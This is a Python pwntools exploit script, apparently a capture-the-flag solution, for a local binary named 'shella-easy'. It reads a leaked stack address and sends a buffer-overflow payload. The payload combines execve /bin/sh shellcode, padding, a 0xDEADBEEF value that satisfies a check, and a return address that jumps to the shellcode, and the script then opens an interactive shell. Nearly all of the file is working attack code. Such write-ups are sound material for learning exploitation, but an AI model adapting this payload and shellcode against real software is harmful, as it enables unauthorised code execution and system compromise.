#!/usr/bin/env python3

from pwn import * 

# initalizing the process
pw = process("./shella-easy")

# Recieve data until the > symbol
pw.recvuntil(b'have a')

the_memory = pw.recv(12)

# sends data to buffer overflow while also sending the address we want
print(the_memory)

payload = b''
shellcode = ""
# This shellcode is from: http://shell-storm.org/shellcode/files/shellcode-827.php`
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

#gdb.attach(pw, gdbscript = 'b *0x8048548')

padding = 100

payload += shellcode

# This is to make sure the shellcode lines up with our deadbeef 
payload += b'A' * (64 - len(shellcode))

# The memory address of deadbeef needed to bypass the conditional statement
payload += p32(0xDEADBEEF)

# This is to line up the return address
payload += b'B' * 8

#payload += cyclic(padding - len(payload)) This shows where the retrun address needs to be

# The return address where are shellcode is in memory
payload += p32(int(the_memory,16))

# Sends the payload
pw.sendline(payload)

print(pw.recvline())

# allows us to interact with the process
pw.interactive()
